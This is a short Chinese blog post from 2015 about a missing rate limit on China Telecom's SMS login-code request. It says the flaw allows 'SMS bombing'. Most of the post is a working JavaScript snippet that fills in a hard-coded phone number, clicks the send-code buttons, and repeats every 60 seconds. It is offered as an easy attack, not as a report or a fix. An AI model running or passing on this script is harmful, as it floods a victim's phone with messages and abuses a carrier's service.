---
title: js定时自动提交
tags: JavaScript
categories: 安全
date: 2015-01-19 00:27:15
---

中国电信登录的时候可以选择，采用随机密码登录，也就是给你手机发送一条验证码，但是由于该提交在验证码之前，且没有次数限制，所以在一定程度上可以造成短信炸弹，利用起来也很简单，只需要基本的js代码即可.

```js
function ss() {
    // location.reload()
    loginName.value = '18949592282';//phone number
    document.getElementById('s12').click(); 
    document.getElementById('passWord_reset').click(); 
    setTimeout("ss()", 60000); 
}
ss();
```